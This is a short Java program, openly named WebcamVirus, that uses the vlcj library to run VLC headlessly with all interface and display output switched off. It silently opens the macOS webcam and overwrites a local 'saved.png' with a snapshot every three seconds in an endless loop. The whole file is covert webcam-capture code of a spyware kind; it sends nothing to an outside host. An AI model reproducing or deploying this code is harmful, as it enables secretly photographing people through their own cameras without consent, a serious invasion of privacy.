import uk.co.caprica.vlcj.player.MediaPlayerFactory;
import uk.co.caprica.vlcj.player.headless.HeadlessMediaPlayer;
import java.awt.image.BufferedImage;
import java.io.IOException;
import java.io.File;
import javax.imageio.ImageIO;
import uk.co.caprica.vlcj.binding.internal.libvlc_state_t;

public class WebcamVirus {
	private static final int TIME_SLEEP = 3*1000;
	public static void main(String[] args) throws Exception {
		// Configure player factory.
	    String[] VLC_ARGS = {
	            "--intf", "dummy",          // no interface
	            "--vout", "dummy",          // we don't want video (output)
	            "--no-audio",               // we don't want audio (decoding)
	            "--no-video-title-show",    // nor the filename displayed
	            "--no-stats",               // no stats
	            "--no-sub-autodetect-file", // we don't want subtitles
	            "--no-disable-screensaver", // we don't want interfaces
	            "--no-snapshot-preview",    // no blending in dummy vout
	    };
	    MediaPlayerFactory mediaPlayerFactory = new MediaPlayerFactory(VLC_ARGS);

	    // Create player.
	    HeadlessMediaPlayer mediaPlayer = mediaPlayerFactory.newHeadlessMediaPlayer();

	    // Select input device.
	    String mrl = "qtcapture://";

	    // Start processing.
	    if (! mediaPlayer.startMedia(mrl)) {
	    	System.out.println("Error while starting media player.");
	    	System.exit(-1);
	    }

	    // Time to initialize webcam
	    Thread.sleep(TIME_SLEEP);

	    BufferedImage bufImg = null;
       	File outputfile = new File("saved.png");
	    while (true) {
	        bufImg = mediaPlayer.getSnapshot();
	        if (bufImg != null) {
    			ImageIO.write(bufImg, "png", outputfile);
    		}
	        Thread.sleep(TIME_SLEEP);
	    }

	    // Stop processing.
	    // mediaPlayer.stop();

	    // Finish program.
	    // mediaPlayer.release();
	    // mediaPlayerFactory.release();
	}
}
